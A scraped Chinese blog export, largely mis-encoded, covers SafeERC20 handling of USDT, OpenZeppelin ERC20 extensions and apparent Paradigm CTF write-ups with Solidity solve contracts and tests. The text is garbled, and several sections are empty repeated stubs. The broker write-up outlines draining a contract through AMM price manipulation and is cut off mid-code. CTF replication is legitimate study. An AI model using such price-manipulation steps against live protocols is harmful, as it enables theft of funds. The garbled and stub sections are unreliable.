åŒç†test_TransferFromWithReturnValueæ“ä½œä¹Ÿæ˜¯ä¼šè¢«revertã€‚è¿™ä¹Ÿå°±è¯´æ˜äº†ï¼Œç”¨æ ‡å‡†çš„ERC20æ¥å£è½¬æ¢USDTï¼Œå°±ä¼šé€ æˆèµ„é‡‘æ°¸ä¹…å°é”çš„æƒ…å†µã€‚å½“ç„¶ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å°†åˆçº¦ä¸­çš„ERC20æ¥å£ä¸­çš„é‚£ä¸¤ä¸ªå‡½æ•°çš„è¿”å›å€¼ç§»é™¤ï¼Œå³ï¼š 1234interface IERC20_USDT &#123; function transfer(address, uint256) external; function transferFrom(address, address, uint256) external;&#125; 3.SafeERC203.1 å…¼å®¹USDTâ€‹ å½“ç„¶è¿˜æœ‰å…¶ä»–çš„è§£å†³æ–¹å¼ï¼Œä¹Ÿæ˜¯æœ€å¸¸ç”¨ä¸€ç§è§£å†³æ–¹å¼ï¼Œé‚£å°±æ˜¯ä½¿ç”¨SafeERC20åº“ã€‚ 1using SafeERC20 for IERC20; â€‹ SafeERC20åšäº†å…¼å®¹ä¸¥æ ¼éµå®ˆä¸ä¸ä¸¥æ ¼éµå®ˆERC20åè®®æ ‡å‡†çš„ä»£å¸ï¼Œå…¼å®¹çš„åŸç†å¦‚ä¸‹ï¼š 12345678910function _callOptionalReturn(IERC20 token, bytes memory data) private &#123; bytes memory returndata = address(token).functionCall(data); if (returndata.length != 0 &amp;&amp; !abi.decode(returndata, (bool))) &#123; revert SafeERC20FailedOperation(address(token)); &#125;&#125;function safeTransfer(IERC20 token, address to, uint256 value) internal &#123; _callOptionalReturn(token, abi.encodeCall(token.transfer, (to, value)));&#125; â€‹ ç®€å•æ¥è¯´å°±æ˜¯ï¼Œé€šè¿‡Address.solçš„ä½çº§è°ƒç”¨æ–¹å¼ï¼Œå¯ä»¥æ£€æµ‹è°ƒç”¨æ˜¯å¦æˆåŠŸï¼Œä¸”æ£€æµ‹æ˜¯å¦æœ‰è¿”å›å€¼ã€‚å½“è°ƒç”¨USDTçš„transferå‡½æ•°æ—¶ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œä¸”return data &#x3D; 0xï¼Œé‚£ä¹ˆå‡½æ•°ä¾¿å¯ä»¥æ‰§è¡Œï¼Œå³è·³è¿‡ifçš„æ£€æµ‹ã€‚ â€‹ åŒç† transferFromå‡½æ•°ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ 4. ERC20ç³»åˆ—æ•°å­—è´§å¸4.1 (Tether USD)USDTâ€‹ ä¸éµå¾ªæ ‡å‡†çš„ERC20åè®®ï¼Œéœ€è¦æ“ä½œè¯¥ä»£å¸æ—¶ï¼Œå»ºè®®ä½¿ç”¨SafeERC20.solã€‚ å‘è¡Œå…¬å¸: ç”± Tether Limited å‘è¡Œï¼Œæˆç«‹äº 2014 å¹´çš„é¦™æ¸¯å…¬å¸ã€‚ å¸‚å€¼: USDT æ˜¯å¸‚å€¼æœ€å¤§çš„ç¨³å®šå¸ä¹‹ä¸€ï¼Œæˆªè‡³ 2022 å¹´ 7 æœˆï¼Œå¸‚å€¼è¶…è¿‡ 650 äº¿ç¾å…ƒï¼Œå ç¨³å®šå¸å¸‚åœº 50% ä»¥ä¸Šçš„ä»½é¢ã€‚ æŒ‚é’©: USDT ä¸ç¾å…ƒ 1:1 æŒ‚é’©ï¼Œæ®ç§°æœ‰å¤§é‡æŠµæŠ¼å“å‚¨å¤‡æ”¯æŒï¼ŒåŒ…æ‹¬ç°é‡‘ã€å•†ä¸šç¥¨æ®å’Œå•†å“ã€‚ å†å²: æœ€æ—©ä½œä¸º RealCoin æ¨å‡ºï¼Œåæ¥äº 2014 å¹´ 11 æœˆæ›´åä¸º Tetherã€‚ç„¶è€Œï¼ŒTether å¹¶ä¸æ˜¯æ²¡æœ‰äº‰è®®çš„ï¼Œæ›¾å› å¤šæ¬¡äº‰è®®è€Œå¤‡å—å…³æ³¨ï¼ŒåŒ…æ‹¬è¢«æŒ‡æ§è¯¯å¯¼æŠ•èµ„è€…å’Œç¼ºä¹å¯¹å‚¨å¤‡çš„é€æ˜åº¦ã€‚ 4.2 (USD Coin)USDCâ€‹ éµå¾ªæ ‡å‡†çš„ERC20åè®®ã€‚æºç é“¾æ¥ï¼šlinkã€‚ å‘è¡Œå…¬å¸: ç”± Circleã€Coinbase å’Œå…¶ä»–é‡‘èç§‘æŠ€å…¬å¸å…±åŒåˆ›ç«‹çš„è´¢å›¢ Center æ˜¯ USDC çš„å‘è¡Œäººã€‚ å¸‚å€¼: USDC æ˜¯æŒ‰å¸‚å€¼è®¡ç®—çš„ç¬¬äºŒå¤§ç¨³å®šå¸ï¼Œæˆªè‡³ 2022 å¹´ 7 æœˆï¼Œå¸‚å€¼è¶…è¿‡ 540 äº¿ç¾å…ƒã€‚ æŒ‚é’©: æ¯ä¸ª USDC ä¸ç¾å…ƒ 1:1 æŒ‚é’©ï¼Œå¹¶ç”±ç°é‡‘å’Œç¾å…ƒç­‰å€¼èµ„äº§æ”¯æŒã€‚ å®‰å…¨æ€§: USDC è¢«è®¤ä¸ºæ˜¯ä¸€ç§æ›´å®‰å…¨çš„ä»·å€¼å‚¨å­˜æ‰‹æ®µï¼Œå› ä¸ºå®ƒæœ‰ç°é‡‘å’Œç°é‡‘ç­‰ä»·ç‰©æ”¯æŒï¼Œè€Œä¸”å—åˆ°ç¾å›½ç›‘ç®¡ã€‚ è¿™ä¸¤ç§ç¨³å®šå¸çš„æ¯”è¾ƒï¼š æµåŠ¨æ€§: USDT çš„äº¤æ˜“é‡æ›´å¤§ï¼Œæ›´å¹¿æ³›å¯ç”¨ï¼Œä½†USDC çš„äº¤æ˜“é‡è¾ƒä½ã€‚ é€æ˜åº¦: USDC åœ¨é€æ˜åº¦å’Œç›‘ç®¡æ–¹é¢è¡¨ç°è¾ƒå¥½ï¼Œè€Œ USDT é¢ä¸´ä¸€äº›äº‰è®®ã€‚ ç”¨é€”: USDT åœ¨æœŸè´§äº¤æ˜“ä¸­å¾ˆå—æ¬¢è¿ï¼Œæä¾›äº†æ›´é«˜çš„æ”¶ç›Šï¼Œè€Œ USDC æ˜¯å»ä¸­å¿ƒåŒ–é‡‘è (DeFi) é¢†åŸŸçš„é¦–é€‰ï¼Œå› ä¸ºå®ƒè¢«è®¤ä¸ºæ›´å®‰å…¨ã€‚ 4.3 å…¶ä»– (Shiba Inu)SHIBï¼šSHIBæ˜¯ä¸€ç§åŸºäºä»¥å¤ªåŠçš„å±±å¯¨å¸ï¼Œç®—æ˜¯ç‹—ç‹—å¸çš„ä¸€ç§æ›¿ä»£å“ï¼Œéµå¾ªæ ‡å‡†çš„ERC20åè®®ã€‚ Binance USD(BUSD)ï¼šéµå¾ªæ ‡å‡†çš„ERC20åè®®ã€‚ DAI Stablecoin (DAI)ï¼šéµå¾ªæ ‡å‡†çš„ERC20åè®®ã€‚ HEX (HEX)ï¼šéµå¾ªæ ‡å‡†çš„ERC20åè®®ã€‚ 5. ERC20 extensionsæ¥è‡ª OpenZeppelinï¼Œé“¾æ¥ã€‚ERC4626å•ç‹¬xueâ€™xi 5.1 ERC1363.sol â€‹ è¿™ä¸ªæ‹“å±•åè®®å®ç°çš„åŠŸèƒ½æ˜¯ï¼Œç”¨æˆ·åœ¨æ‰§è¡Œtransferã€transferFromå’Œapproveæ“ä½œçš„æ—¶å€™ï¼Œå¯ä»¥ä¼ å…¥calldataï¼Œå®Œæˆä¸€äº›å‡½æ•°è°ƒç”¨ï¼Œæˆ–è€…æ˜¯å‚æ•°çš„ä¼ é€’ï¼Œå®ç°é€»è¾‘ç±»ä¼¼ERC721çš„ checkOnERC721Received()ã€‚ å®ƒçš„_checkOnTransferReceived()å’Œ_checkOnApprovalReceived()å‡½æ•°ä¼šåˆ†åˆ«å»è°ƒç”¨IERC1363Receiver(to).onTransferReceivedï¼ŒIERC1363Spender(spender).onApprovalReceivedï¼Œè¿™é‡Œä¼šåŸ‹ä¸‹è¢«é‡å…¥çš„å®‰å…¨éšæ‚£ï¼Œåœ¨å®ç”¨è¿™ä¸ªåè®®çš„æ—¶å€™éœ€è¦æ³¨æ„è¿™ç‚¹ã€‚ 5.2 ERC20Burnable.sol â€‹ è¯¥åˆçº¦æä¾›äº†é”€å¸åŠŸèƒ½ã€‚ burn(uint256 value)ï¼šé”€æ¯msg.senderçš„valueä¸ªä»£å¸ã€‚ burnFrom(address account, uint256 value) ï¼šmsg.senderé”€æ¯accountçš„valueä¸ªä»£å¸ï¼Œå‰ææ˜¯accountç»™äºˆmsg.senderæƒé™ã€‚ 5.3 ERC20Capped.sol æˆ‘çš„ç†è§£æ˜¯ï¼Œç»™ERC20ä»£å¸çš„çš„totalsupplyç›–å¸½å­ï¼Œä¹Ÿå°±æ˜¯è®¾ç½®ä¸Šé™ï¼Œè®¾ç½®æŸä¸ªERC20ä»£å¸çš„å‘è¡Œé‡ä¸èƒ½è¶…è¿‡capã€‚é™åˆ¶çš„é€»è¾‘åœ¨è¿™é‡Œ(from&#x3D;&#x3D;0ï¼Œåˆ™è¢«æ£€æµ‹ä¸ºé“¸å¸æ“ä½œ)ï¼š 1234567if (from == address(0)) &#123; uint256 maxSupply = cap(); uint256 supply = totalSupply(); if (supply &gt; maxSupply) &#123; revert ERC20ExceededCap(supply, maxSupply); &#125; &#125; 5.4 ERC20FlashMint.sol â€‹ è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªå€Ÿè´·åŠŸèƒ½ï¼Œåªèƒ½å€Ÿè¯¥åˆçº¦ç”Ÿæˆçš„ä»£å¸ï¼Œä¸”æœ€å¤§æ¥å¾…é¢ä¸ºï¼štoken == address(this) ? type(uint256).max - totalSupply() : 0ï¼›è¿˜éœ€è¦æ”¯ä»˜feeï¼Œè¿™ä¸ªå€Ÿè´·å‡½æ•°ä¸éœ€è¦ä¸»åŠ¨è¿˜æ¬¾ï¼Œå› ä¸ºtaé‡‡ç”¨çš„æ˜¯burnæ“ä½œï¼Œç›´æ¥å°†ä½ æ‰‹ä¸­å€Ÿæ¥çš„tokenå…¨éƒ¨é”€æ¯ã€‚ä½†æ˜¯è¿™ä¸å½±å“æ‰§è¡ŒæŸäº›é‡å…¥æ”»å‡»ï¼Œæ¯”å¦‚å¯ä»¥å€Ÿé’±å»æ‰§è¡Œå¥—åˆ©æ“ä½œè¿™ç±»çš„ï¼Œè¿™æ˜¯å€Ÿè´·å‡½æ•°çš„â€œé€šç—…â€å§ã€‚ 5.5 ERC20Pausable.sol â€‹ è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªç´§æ€¥åœæ­¢åŠŸèƒ½ï¼Œåœ¨_update()å‡½æ•°åŠ ä¸ŠwhenNotPausedä¿®é¥°ç¬¦ï¼Œå½“æ‰€æœ‰è€…æš‚åœåˆçº¦æ—¶ï¼Œè¯¥åˆçº¦ç”Ÿæˆçš„ä»£å¸å°†ä¸èƒ½æ‰§è¡Œä¸€ç³»åˆ—æ“ä½œï¼Œå¦‚transferã€mintã€transferFromç­‰ã€‚ 5.6 ERC20Permit.sol â€‹ è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªæ–°çš„æˆæƒæ“ä½œï¼Œpermit()å‡½æ•°çš„ä½œç”¨ä¾¿æ˜¯å®Œæˆ ownerå¯¹spenderçš„æˆæƒï¼Œä¸ªäººç†è§£æ˜¯ï¼Œå› ä¸ºåŸERC20ä¸­çš„approveå‡½æ•°å¿…é¡»æ˜¯owneräº²è‡ªå»è°ƒç”¨æ‰èƒ½å®Œæˆæˆæƒï¼Œè¿™æ¯”è¾ƒéº»çƒ¦ownerï¼Œè€Œpermitåˆ™æ˜¯å¯ä»¥é€šè¿‡owneræä¾›çš„ç­¾åæ¥éªŒè¯ï¼Œå¹¶æ‰§è¡Œownerå¯¹spenderçš„æˆæƒæ“ä½œã€‚ ä¸¾ä¸ªä¾‹å­æ¥å¯¹æ¯”ï¼Œä»¥å¼€é—¨ä¸ºä¾‹ï¼š åŸERC20çš„æˆæƒæ–¹å¼ï¼šowneræƒ³è®©spenderè¿›å±‹æ‹¿ä¸œè¥¿ï¼Œè€Œowneréœ€è¦äº²è‡ªå¼€é—¨è®©ä»–è¿›å» ERC20Permitçš„æˆæƒæ–¹å¼ï¼šåŒæ ·çš„ç¤ºä¾‹ï¼Œownerå¯ä»¥ç›´æ¥æŠŠå®¶é—¨å£çš„é’¥åŒ™ç»™spenderï¼Œè®©spenderç›´æ¥å»å¼€é—¨æ‹¿ä¸œè¥¿å°±å¥½äº†ã€‚ 5.7 ERC20Votes.sol â€‹ è¯¥åˆçº¦æ”¯æŒç±»ä¼¼Compoundçš„æŠ•ç¥¨å’Œæˆæƒã€‚ 5.8 ERC20Wrapper.sol â€‹ è¯¥åˆçº¦æ”¯æŒä»£å¸çš„åŒ…è£…ï¼Œç”¨æˆ·å¯ä»¥å­˜å…¥å’Œå–å‡º_underlyingä»£å¸ï¼Œå­˜å…¥å¤šå°‘_underlyingä»£å¸ï¼Œå°±å¯ä»¥é“¸é€ å¤šå°‘ERC20Wrapperä»£å¸ï¼ŒåŒç†å–å‡ºå¤šå°‘ _underlyingä»£å¸ï¼Œä¾¿ä¼šé”€æ¯å¤šå°‘ERC20Wrapperä»£å¸ä»£å¸ã€‚ è¿˜æä¾›äº†ä¸€ä¸ª _recoverå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯å°†é”™è¯¯è½¬å…¥è¯¥åˆçº¦çš„ _underlyingä»£å¸æ•°é‡å…¨éƒ¨é“¸é€ ä¸ºERC20Wrapperä»£å¸ï¼Œæˆ‘å¯¹â€œé”™è¯¯è½¬å…¥â€çš„ç†è§£æ˜¯ï¼Œæ²¡æœ‰é€šè¿‡depositFor()å‡½æ•°è½¬å…¥ _underlyingä»£å¸ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"}]},{"title":"æ–°ç¯‡ç« ","slug":"Experience/é‡æ–°å¼€å§‹","date":"2024-01-01T02:00:00.000Z","updated":"2024-01-01T02:00:00.000Z","comments":true,"path":"2024/01/01/Experience/é‡æ–°å¼€å§‹/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/01/Experience/%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/","excerpt":"","text":"2024å¹´æ˜¯ä¸å¹³å‡¡çš„ä¸€å¹´ï¼Œå‹‡æ•¢ä¸ºè‡ªå·±çš„æƒ³æ³•ä»˜ä¹‹è¡ŒåŠ¨ï¼ 2023å¹´çš„é‚£äº›å¤±è´¥ä¸é—æ†¾ï¼Œå°½æŠ›ä¹‹è„‘åã€‚ æ‚Ÿå·²å¾€ä¹‹ä¸è°ï¼ŒçŸ¥æ¥è€…ä¹‹å¯è¿½ï¼","categories":[],"tags":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/tags/Experience/"}]},{"title":"Paradigm_CTF_2022","slug":"CTFS/Paradigm CTF 2022/Paradigm_CTF_2022","date":"2023-11-19T03:50:10.000Z","updated":"2023-11-19T03:50:10.000Z","comments":true,"path":"2023/11/19/CTFS/Paradigm CTF 2022/Paradigm_CTF_2022/","link":"","permalink":"https://biyouqiuqiu.com/2023/11/19/CTFS/Paradigm%20CTF%202022/Paradigm_CTF_2022/","excerpt":"","text":"å‰è¨€ æ—¨åœ¨å¤ç°ï¼Œæ¯”èµ›ç¯å¢ƒæ²¡äº†ï¼Œåªèƒ½è‡ªå·±æ­å»ºç¯å¢ƒï¼Œå°½å¯èƒ½è¿˜åŸæ¯”èµ›åœºæ™¯ã€‚ 0x00-random1.request å°†Randomåˆçº¦ä¸­çš„solvedä¿®æ”¹ä¸ºtrueã€‚ 2. analysis ç­¾åˆ°é¢˜ï¼Œæ²¡å•¥è¯´çš„ã€‚ 3. solveæ”»å‡»åˆçº¦ï¼š 123456789101112131415161718192021// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.15;import &quot;../../../src/Paradigm_CTF_2022/random/Setup.sol&quot;;contract RandomExploit &#123; Setup setup; Random random; constructor(address _setup) &#123; setup = Setup(_setup); random = setup.random(); &#125; function pwn() public &#123; random.solve(4); require(setup.isSolved(), &quot;!solved&quot;); &#125;&#125; æµ‹è¯•ï¼š 12345678910111213141516171819202122// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.15;import &quot;./RandomExploit.sol&quot;;import &quot;forge-std/Test.sol&quot;;contract TestRandomExploit is Test &#123; Setup setup; RandomExploit exploit; function setUp() public &#123; setup = new Setup(); exploit = new RandomExploit(address(setup)); &#125; function test_isSovled() public &#123; exploit.pwn(); assertEq(setup.isSolved(), true); &#125;&#125; ç»“æœï¼š 0x01-rescue1.request https://blog.cyberight.capital/paradigm-ctf-2022-solution-writeup-46e8188e3726 2. analysis 3. solveæ”»å‡»åˆçº¦ï¼š 12345```*æµ‹è¯•ï¼š*```solidity ç»“æœï¼š 0x01.request 2. analysis 3. solveæ”»å‡»åˆçº¦ï¼š 12345```*æµ‹è¯•ï¼š*```solidity ç»“æœï¼š 0x01.request 2. analysis 3. solveæ”»å‡»åˆçº¦ï¼š 12345```*æµ‹è¯•ï¼š*```solidity ç»“æœï¼š 0x01.request 2. analysis 3. solveæ”»å‡»åˆçº¦ï¼š 12345```*æµ‹è¯•ï¼š*```solidity ç»“æœï¼š 0x01.request 2. analysis 3. solveæ”»å‡»åˆçº¦ï¼š 12345```*æµ‹è¯•ï¼š*```solidity ç»“æœï¼š 0x01.request 2. analysis 3. solveæ”»å‡»åˆçº¦ï¼š 12345```*æµ‹è¯•ï¼š*```solidity ç»“æœï¼š","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Paradigm-CTF-2022","slug":"CTFS/Paradigm-CTF-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2022/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Paradigm_CTF_2021","slug":"CTFS/Paradigm CTF 2021/Paradigm_CTF_2021","date":"2023-10-14T03:50:10.000Z","updated":"2023-10-14T03:50:10.000Z","comments":true,"path":"2023/10/14/CTFS/Paradigm CTF 2021/Paradigm_CTF_2021/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/14/CTFS/Paradigm%20CTF%202021/Paradigm_CTF_2021/","excerpt":"","text":"å‰è¨€ æ—¨åœ¨ä½¿ç”¨æ–°å­¦çš„foundryæ¥å¤ç°ï¼Œæå‡è‡ªèº«æ°´å¹³ï¼Œä»¥åŠåŠ å¼ºå¯¹å·¥å…·çš„ä½¿ç”¨ï¼Œæ¯”èµ›ç¯å¢ƒæ²¡äº†ï¼Œåªèƒ½è‡ªå·±æ¨¡æ‹Ÿã€‚ ä»£ç ä»“åº“ï¼šé“¾æ¥ 0x00-hello1. request ä½¿Setupåˆçº¦ä¸­çš„isSolvedå‡½æ•°è¿”å›trueã€‚ 2. analysis ç­¾åˆ°é¢˜ï¼Œå¾ˆç®€å•ï¼Œä¸å¿…å¤šè¯´ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;../../../src/Paradigm_CTF_2021/hello/Setup.sol&quot;;contract HelloHacker is Test &#123; Setup setup; Hello hello; function setUp() public &#123; setup = new Setup(); hello = setup.hello(); &#125; function test_isSolved() public &#123; hello.solve(); // set solved = true assertEq(setup.isSolved(), true); &#125;&#125; 0x01-secure1. request ä½¿å¾—address(setup)åˆçº¦çš„WETHä»£å¸&#x3D;&#x3D;50etherã€‚ 2. analysis åˆ†æsetupåˆçº¦æ„é€ å‡½æ•°çš„é€»è¾‘ï¼Œ 12345wallet.allowModule(tokenModule); // _allowed[tokenModule] = trueWETH.deposit.value(msg.value)(); // address(this)å¾€WETHå­˜äº†50 etherWETH.approve(address(wallet), uint(-1)); // æˆæƒ wallet type(uint256).max// TokenModule(0x00).deposit.selector ç­‰æ•ˆäº TokenModule.deposit.selectorwallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value)); å› ä¸ºæ²¡æœ‰äº†æ¯”èµ›ç¯å¢ƒï¼Œå¤ç°èµ·æ¥æœ‰ç‚¹å›°éš¾ã€‚emmmï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼šSetupå¾€WETH9ä¸­å­˜å…¥äº†50 etherï¼Œå¹¶ä¸”Setupç»™Walletæˆæƒä½¿å…¶èƒ½å¤Ÿæ“ä½œSetupçš„æ‰€æœ‰WETHä»£å¸ï¼Œç„¶åæœ€åä¸€å¥å°±æ˜¯Walletå°†Setupçš„50 ether WETHä»£å¸ï¼Œå…¨éƒ¨å­˜å…¥äº†TokenModuleä¸­ï¼Œæ­¤æ—¶çš„WETH.balanceOf(address(this)) == 0. WETH.approve(address(wallet), uint(-1))è¿™ä¸€æ­¥å¾ˆç¥å¥‡ï¼Œç›´æ¥ä½¿å¾—WETH9ä¸­çš„transferFromå‡½æ•°å¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼ˆåœ¨delegatecallå’Œcallçš„ä¼ é€’é“¾å¦‚ä¸‹ï¼‰ã€‚ TokenModuleçš„withdrawå‡½æ•°æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥ç›´æ¥å–å‡ºæ¥ï¼Œä½†æ˜¯æ— æ³•è·å–setupä¸­çš„TokenModuleï¼Œè¡Œä¸é€šã€‚ç½‘ä¸Šçœ‹ä¸€äº›é¢˜è§£ï¼Œè¯´æŒ‘æˆ˜è€…æ‹¥æœ‰5000etherğŸ˜“ğŸ˜“ğŸ˜“ï¼Œé‚£è¿˜æƒ³é‚£ä¹ˆå¤šå¹²å˜›ï¼Œç›´æ¥è‡ªå·±å­˜50ether WETHï¼Œå†è½¬ç»™Setupå°±okäº†ã€‚ã€‚ã€‚è§£é¢˜æ–¹å¼æœ‰ç‚¹å‡ºä¹æ„æ–™ï¼Œå¤ç°è¿‡ç¨‹åªèƒ½è‡ªå·±å®ç°WETH9åˆçº¦äº†ã€‚ WETH9åˆçº¦é“¾æ¥ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./Interface.sol&quot;;contract SecureHacker is Test &#123; string constant path_WETH9 = &quot;out/WETH9.sol/WETH9.json&quot;; string constant path_SetUp = &quot;out/secure/Setup.sol/Setup.json&quot;; uint public constant WANT = 50 ether; WETH9 WETH; Setup setup; function setUp() public payable &#123; WETH = WETH9(deploy_WETH9()); setup = Setup(this.deploy_Setup&#123;value:WANT&#125;(address(WETH))); &#125; function test_isSolve() public &#123; console2.log(address(WETH), address(setup)); WETH.deposit&#123;value:WANT&#125;(); // ä½¿å¾—hacker&#x27;s WETH == 50 ether WETH.transfer(address(setup), WANT); // å°† 50 ether WETH è½¬ç§»ç»™ setup assertEq(setup.isSolved(), true); &#125; function deploy_WETH9() internal returns (address weth9) &#123; bytes memory WETH9_bytycode = vm.getCode(path_WETH9); assembly &#123; weth9 := create(0, add(WETH9_bytycode, 0x20), mload(WETH9_bytycode)) &#125; &#125; function deploy_Setup(address _weth9) external payable returns (address _setup) &#123; require(msg.value == WANT, &quot;Please pay 50 ether...&quot;); bytes memory setup_bytycode = abi.encodePacked(vm.getCode(path_SetUp), abi.encode(_weth9)); assembly &#123; _setup := create(WANT, add(setup_bytycode, 0x20), mload(setup_bytycode)) &#125; &#125;&#125; 0x02-babycrypto1. request è¿™æ˜¯ä¸€é“pythoné¢˜ï¼Œå…ˆè·³è¿‡ã€‚ 2. analysis é¦–å…ˆéœ€è¦å°†pythonçš„ç‰ˆæœ¬é™ä½ï¼Œå¦åˆ™æ— æ³•ä¸‹è½½sha3åº“ï¼Œæˆ‘è¿™é‡Œä¸‹è½½çš„python3.6ï¼Œä¸”pipçš„ç‰ˆæœ¬ä¸º 10.0.1ã€‚ 3. solve ä»¥åæŠ€æœ¯ä¸Šæ¥äº†ï¼Œå†å›æ¥çœ‹çœ‹ 0x03-broker1. request å°†Brokeråˆçº¦ä¸­çš„WETHä»£å¸å–å‡º20-25 etherï¼Œä½¿å¾—Brokeråˆçº¦çš„WETHä½™é¢å°äº5 etherã€‚ 2. analysis è¿™é“é¢˜ï¼Œemmmmï¼Œæˆ‘ä¸ç†è§£çš„æ˜¯ï¼Œæˆ‘å¯ä»¥æ‹¥æœ‰WETH 5000 etherï¼ŒAWT æ— é™é‡ï¼Œä½†æ˜¯Tokençš„åœ°å€æ˜¯éšæœºç”Ÿæˆçš„ï¼Œtaçš„æ•°å€¼å¯ä»¥æ¯”WETHçš„åœ°å€çš„æ•°å€¼å¤§ï¼Œäº¦å¯ä»¥æ¯”taå°ï¼Œæ‰€ä»¥ä¸åŒæ’åºæ–¹å¼åšé¢˜ä¹Ÿä¼šä¸ä¸€æ ·ï¼Œéš¾æã€‚ã€‚ã€‚ è¿™é“é¢˜å‡å®šAWTä¸ºreverse0ï¼ŒWETHä¸ºreverse1ã€‚ åˆæ­¥åˆ†æï¼š æˆ‘æ‰‹ä¸­æ‹¥æœ‰ 5000 ETHï¼Œå³å¯ä»¥æ¢æˆ 5000 WETHï¼Œçœ‹åˆ°Tokenåˆçº¦ä¸­çš„airdropå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ¼æ´ï¼ˆå¯ä»¥ä»è¯¥å‡½æ•°ä¸­è·å–æ— æ•°çš„tokenï¼Œå®ç°æ–¹å¼æ˜¯ï¼šæ‹¥æœ‰å¾ˆå¤šè´¦æˆ·ï¼‰ã€‚ æ­¤æ—¶å¯ä»¥å°†å„ä¸ªåˆçº¦çš„tokenå’ŒWETHçš„æ•°ç›®åˆ—å‡ºï¼š contract Token balance WETH balance Setup 0 0 Broker 500_000 ether 25 ether Pair 500_000 ether 25 ether Hacker too much 5000 ether rateçš„å€¼æ˜¯å¯ä»¥ç”±æˆ‘æ§åˆ¶çš„ï¼Œå› ä¸ºæˆ‘æ‰‹ä¸­æœ‰ç€ä¼—å¤šçš„WETH å’Œ Tokenï¼Œæˆ‘å¯ä»¥æ§åˆ¶æ±‡ç‡ï¼ï¼ï¼ è¯¥é¢˜çš„é¢˜çœ¼åœ¨äºliquidata(address,uint256)å‡½æ•°ä¸­ï¼Œåªè¦ä½¿å¾—collateralValueRepaidçš„å€¼å¤„äº(20 ether,25 ether)èŒƒå›´å³å¯ã€‚è¿™ä¾¿éœ€è¦å°† rate()çš„å€¼å‹å°ï¼Œå³å°†å…¶ä¸­çš„reverse0å‡å€¼ï¼Œreverse1è´¬å€¼ï¼ˆåœ¨V2ä¸­è¦ç»´æŒKå€¼æ’å®šï¼Œbalance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2)ï¼Œrate &#x3D; reverse0 &#x2F; reverse1ï¼Œå°†reverse0çš„æ•°é‡å‡å°‘å³å‡å€¼ï¼Œå°†reverse1çš„æ•°é‡å¢å¤šå³è´¬å€¼ï¼‰ã€‚ ç°åœ¨çš„é—®é¢˜æ˜¯æ€ä¹ˆå‡‘è¿™ä¸ªcollateralValueRepaidï¼Œåˆå§‹çš„pairçš„æ»‘ç‚¹k=500000*25=1.25*10^7ï¼Œå°†collateralValueRepaidç”¨è¡¨è¾¾å¼è¡¨ç¤ºä¸ºï¼šcollateralValueRepaid=amount*reverse1/reverse0ï¼Œæˆ‘çš„å¤„ç†æ–¹å¼ä¸ºï¼šå­˜å…¥4975 WETHï¼Œæ¢å‡º450 000 AWTï¼Œæ­¤æ—¶çš„æ»‘ç‚¹ä¸ºk=5000*50000=2.5*10^8æ»¡è¶³swapçš„æ¡ä»¶ï¼Œliquidate::amountï¼Œamount&#x3D;23 ether * broker.rate()ï¼Œå› ä¸ºdebt[broker]=250_000 etherï¼Œæ‰€ä»¥æ»¡è¶³safeDebt(user) &lt;= debt[user] &amp;&amp; debt[user] - amount &gt;= 0ã€‚ ç»¼ä¸Šï¼Œæ”»å‡»æ€è·¯ä¸ºï¼š è·å–30 ether AWT å…‘æ¢ 4975 ether WETHï¼Œå¹¶å­˜å…¥pairä¸­ é€šè¿‡swapå‡½æ•°ï¼Œå…‘æ¢å‡º450000 ether AWT ç»™brokeræˆæƒï¼Œå†é€šè¿‡liquidateå–å‡º 23 ether WETH æ²¡æœ‰æ¯”èµ›ç¯å¢ƒï¼Œè¦å¤ç°è¿˜æ˜¯æœ‰ç‚¹å›°éš¾çš„ï¼Œå°±ä¸å»éƒ¨ç½²V2ç›¸å…³åˆçº¦äº† 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/broker/Setup.sol&quot;;contract BrokerHacker_ &#123; Setup setup; IUniswapV2Pair pair; WETH9 weth; Token token; Broker broker; // init parameter constructor(address _setup) &#123; setup = Setup(_setup); pair = setup.pair(); weth 